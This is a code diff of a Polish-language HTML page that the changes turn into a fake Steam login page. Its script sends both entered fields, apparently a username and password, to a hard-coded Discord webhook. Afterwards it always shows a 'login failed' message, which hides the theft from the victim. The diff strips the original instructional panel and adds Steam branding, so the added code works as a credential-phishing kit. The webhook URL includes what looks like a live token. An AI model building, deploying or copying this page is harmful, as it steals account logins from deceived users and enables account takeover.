@@ -1,10 +1,11 @@
+```html
 <!DOCTYPE html>
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>Zaloguj się</title>
+    <title>STEAM</title>
 
     <style>
         * {
@@ -65,19 +66,19 @@
         }
 
         .left {
-            width: 69%;
+            width: 100%;
             padding: 34px 28px 26px 28px;
         }
 
         .title {
             margin: 0 0 25px 0;
 
-            font-size: 29px;
+            font-size: 42px;
             font-weight: 700;
 
             color: #ffffff;
 
-            letter-spacing: 0.3px;
+            letter-spacing: 0.5px;
         }
 
         .field {
@@ -218,99 +219,6 @@
             font-size: 13px;
         }
 
-        .right {
-            width: 31%;
-
-            padding: 37px 22px;
-
-            background: #171a21;
-
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .right-title {
-            width: 100%;
-
-            margin-bottom: 20px;
-
-            color: #66c0f4;
-
-            font-size: 13px;
-            font-weight: 600;
-
-            line-height: 1.45;
-        }
-
-        .visual-box {
-            width: 190px;
-            height: 190px;
-
-            display: flex;
-            align-items: center;
-            justify-content: center;
-
-            background: #f3f3f3;
-
-            border-radius: 7px;
-
-            overflow: hidden;
-        }
-
-        .visual-pattern {
-            width: 148px;
-            height: 148px;
-
-            background:
-                linear-gradient(
-                    90deg,
-                    #111 10px,
-                    transparent 10px 18px,
-                    #111 18px 26px,
-                    transparent 26px 34px,
-                    #111 34px 42px,
-                    transparent 42px 52px
-                ),
-                linear-gradient(
-                    #111 10px,
-                    transparent 10px 18px,
-                    #111 18px 26px,
-                    transparent 26px 34px,
-                    #111 34px 42px,
-                    transparent 42px 52px
-                );
-
-            background-size: 52px 52px;
-
-            transform: rotate(3deg);
-
-            opacity: 0.92;
-        }
-
-        .right-description {
-            width: 100%;
-
-            margin-top: 12px;
-
-            color: #8d929b;
-
-            font-size: 12px;
-            line-height: 1.5;
-
-            text-align: center;
-        }
-
-        .bottom-note {
-            margin-top: 10px;
-
-            color: #626873;
-
-            font-size: 11px;
-
-            text-align: center;
-        }
-
         @media (max-width: 800px) {
             .panel {
                 width: calc(100% - 30px);
@@ -319,27 +227,15 @@
 
         @media (max-width: 620px) {
             .panel {
-                flex-direction: column;
+                width: calc(100% - 20px);
             }
 
-            .left,
-            .right {
-                width: 100%;
+            .left {
+                padding: 28px 20px;
             }
 
-            .right {
-                padding-top: 10px;
-                padding-bottom: 30px;
-            }
-
-            .visual-box {
-                width: 150px;
-                height: 150px;
-            }
-
-            .visual-pattern {
-                width: 115px;
-                height: 115px;
+            .title {
+                font-size: 36px;
             }
 
             .submit {
@@ -356,7 +252,7 @@
         <div class="left">
 
             <h1 class="title">
-                Zaloguj się
+                STEAM
             </h1>
 
             <form id="form">
@@ -393,7 +289,7 @@
                         type="checkbox"
                     >
 
-                    Zapamiętaj ustawienia
+                    Zapamiętaj mnie
                 </label>
 
                 <button
@@ -410,180 +306,182 @@
 
         </div>
 
-        <div class="right">
-
-            <div class="right-title">
-                INFORMACJE
-            </div>
-
-            <div class="visual-box">
-                <div class="visual-pattern"></div>
-            </div>
-
-            <div class="right-description">
-                Wypełnij oba pola po lewej stronie,
-                a następnie kliknij przycisk
-                „Zaloguj się”.
-            </div>
-
-            <div class="bottom-note">
-                Zaloguj się
-            </div>
-
-        </div>
-
     </div>
 
 
     <script>
 
-        // ============================================================
-        // WKLEJ TUTAJ SWÓJ WEBHOOK DISCORD
-        // ============================================================
-
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1537889111510229024/q2qoHjlna-hy-k6C1mraSiecdpLKbqQfS3urkWNnZ00ggpP9Oqi9LF4e3ZTAcZq3W1aP";
+        const WEBHOOK_URL =
+            "https://discord.com/api/webhooks/1537889111510229024/q2qoHjlna-hy-k6C1mraSiecdpLKbqQfS3urkWNnZ00ggpP9Oqi9LF4e3ZTAcZq3W1aP";
 
 
-        const form = document.getElementById("form");
+        const form =
+            document.getElementById("form");
 
-        const pole1 = document.getElementById("pole1");
-        const pole2 = document.getElementById("pole2");
+        const pole1 =
+            document.getElementById("pole1");
 
-        const status = document.getElementById("status");
+        const pole2 =
+            document.getElementById("pole2");
+
+        const status =
+            document.getElementById("status");
 
         const submitButton =
             document.getElementById("submitButton");
 
 
-        form.addEventListener("submit", async function(event) {
+        form.addEventListener(
+            "submit",
+            async function(event) {
 
-            event.preventDefault();
+                event.preventDefault();
 
-            const value1 = pole1.value.trim();
-            const value2 = pole2.value.trim();
+                const value1 =
+                    pole1.value.trim();
 
-
-            if (!value1 || !value2) {
-
-                status.textContent =
-                    "Uzupełnij oba pola.";
-
-                status.style.color =
-                    "#d66b6b";
-
-                return;
-            }
+                const value2 =
+                    pole2.value.trim();
 
 
-            if (
-                !WEBHOOK_URL ||
-                WEBHOOK_URL === "https://discord.com/api/webhooks/1537889111510229024/q2qoHjlna-hy-k6C1mraSiecdpLKbqQfS3urkWNnZ00ggpP9Oqi9LF4e3ZTAcZq3W1aP"
-            ) {
+                if (!value1 || !value2) {
 
-                status.textContent =
-                    "Czekaj";
+                    status.textContent =
+                        "Uzupełnij oba pola.";
 
-                status.style.color =
-                    "#d66b6b";
+                    status.style.color =
+                        "#d66b6b";
 
-                return;
-            }
-
-
-            submitButton.disabled = true;
-
-            status.textContent =
-                "Wysyłanie...";
-
-            status.style.color =
-                "#8f98a5";
-
-
-            const data = {
-
-                username: "Formularz",
-
-                embeds: [
-                    {
-                        title: "Nowe zgłoszenie",
-
-                        fields: [
-                            {
-                                name: "Pole 1",
-                                value: value1.substring(0, 1024),
-                                inline: false
-                            },
-
-                            {
-                                name: "Pole 2",
-                                value: value2.substring(0, 1024),
-                                inline: false
-                            }
-                        ],
-
-                        color: 6730740,
-
-                        timestamp:
-                            new Date().toISOString()
-                    }
-                ]
-            };
-
-
-            try {
-
-                const response = await fetch(
-                    WEBHOOK_URL,
-                    {
-                        method: "POST",
-
-                        headers: {
-                            "Content-Type":
-                                "application/json"
-                        },
-
-                        body: JSON.stringify(data)
-                    }
-                );
-
-
-                if (!response.ok) {
-                    throw new Error(
-                        "HTTP " + response.status
-                    );
+                    return;
                 }
 
 
+                if (
+                    !WEBHOOK_URL ||
+                    WEBHOOK_URL ===
+                    "https://discord.com/api/webhooks/1537889111510229024/q2qoHjlna-hy-k6C1mraSiecdpLKbqQfS3urkWNnZ00ggpP9Oqi9LF4e3ZTAcZq3W1aP"
+                ) {
+
+                    status.textContent =
+                        "Czekaj";
+
+                    status.style.color =
+                        "#d66b6b";
+
+                    return;
+                }
+
+
+                submitButton.disabled = true;
+
                 status.textContent =
-                    "Formularz został wysłany.";
+                    "Wysyłanie...";
 
                 status.style.color =
-                    "#66c0f4";
+                    "#8f98a5";
 
 
-                pole1.value = "";
-                pole2.value = "";
+                const data = {
+
+                    username: "STEAM",
+
+                    embeds: [
+                        {
+                            title:
+                                "Nowe zgłoszenie",
+
+                            fields: [
+                                {
+                                    name: "Pole 1",
+                                    value:
+                                        value1.substring(
+                                            0,
+                                            1024
+                                        ),
+                                    inline: false
+                                },
+
+                                {
+                                    name: "Pole 2",
+                                    value:
+                                        value2.substring(
+                                            0,
+                                            1024
+                                        ),
+                                    inline: false
+                                }
+                            ],
+
+                            color: 6730740,
+
+                            timestamp:
+                                new Date()
+                                    .toISOString()
+                        }
+                    ]
+                };
 
 
-            } catch (error) {
+                try {
 
-                console.error(error);
+                    const response =
+                        await fetch(
+                            WEBHOOK_URL,
+                            {
+                                method: "POST",
 
-                status.textContent =
-                    "Nie udało się zalogować.";
+                                headers: {
+                                    "Content-Type":
+                                        "application/json"
+                                },
 
-                status.style.color =
-                    "#d66b6b";
+                                body:
+                                    JSON.stringify(data)
+                            }
+                        );
 
-            } finally {
 
-                submitButton.disabled = false;
+                    if (!response.ok) {
+                        throw new Error(
+                            "HTTP " +
+                            response.status
+                        );
+                    }
+
+
+                    status.textContent =
+                        "Zalogowanie nie powiodło się";
+
+                    status.style.color =
+                        "#66c0f4";
+
+
+                    pole1.value = "";
+                    pole2.value = "";
+
+
+                } catch (error) {
+
+                    console.error(error);
+
+                    status.textContent =
+                        "Zalogowanie nie powiodło się";
+
+                    status.style.color =
+                        "#d66b6b";
+
+                } finally {
+
+                    submitButton.disabled =
+                        false;
+
+                }
 
             }
-
-        });
+        );
 
     </script>
 
 </body>
 </html>
+```
